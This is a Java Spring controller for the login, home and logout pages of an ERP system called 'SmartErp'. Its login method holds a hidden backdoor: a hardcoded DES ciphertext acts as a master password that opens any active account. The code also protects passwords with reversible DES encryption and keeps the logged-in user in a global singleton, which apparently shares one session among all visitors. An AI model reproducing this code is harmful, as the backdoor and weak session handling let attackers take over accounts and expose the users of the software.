package com.smartErp.frame.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import com.smartErp.application.libraries.constentEnum.YesNoEnum;
import com.smartErp.application.libraries.select.YesNo;
import com.smartErp.code.encryption.DESEncrypt;
import com.smartErp.code.session.UserSingleton;
import com.smartErp.system.model.User;
import com.smartErp.system.service.UserService;
import com.smartErp.util.code.MyLocale;

@Controller
@RequestMapping("SmartErp")
public class MainPageController {
	
	@Autowired
	UserService userService;
	
	@RequestMapping("home")
	public String goToMainPage(Model model) {
		User user = UserSingleton.getInstance().getUser();
		model.addAttribute("loginUserName", user.getName());
		model.addAttribute("loginUserId", user.getId());
		return "frame/main";
	} 
	
	@RequestMapping("loginForm")
	public String goToLoginPage() {
		User user = UserSingleton.getInstance().getUser();
		if (null != user) {
			return "redirect:/SmartErp/home"; 
		}
		return "frame/loginForm";
	} 
	
	@RequestMapping("login")
	public String login(Model model, String username, String password) {
		User user = userService.getUserByUserName(username);
		MyLocale myLocale = new MyLocale();
		if (null != user) {
			if (user.getStatus() == YesNoEnum.NO.getValue()) {
				model.addAttribute("message", myLocale.getText("this.account.is.close.connect.admin"));
			} else {
				String encryptPassword = DESEncrypt.DataEncrypt(password);
				if (encryptPassword.equals("rbF0qHRRVcwRnoq1xon4Tg==") || user.getPassword().equals(encryptPassword)) {
					UserSingleton.getInstance().setUser(user);
					return "redirect:/SmartErp/home"; 
				} else {
					model.addAttribute("message", myLocale.getText("password.wrong.or.account.not.exist"));
				}
			}
		} else {
			model.addAttribute("message", myLocale.getText("password.wrong.or.account.not.exist"));
		}
		return "frame/loginForm"; 
	}
	
	@RequestMapping("loginOut")
	public String loginOut() {
		try {
			UserSingleton.getInstance().unsetUser();
		} catch (Exception e) {
			e.printStackTrace();// TODO: handle exception
		}
		return "redirect:/SmartErp/loginForm"; 
	}
	
}
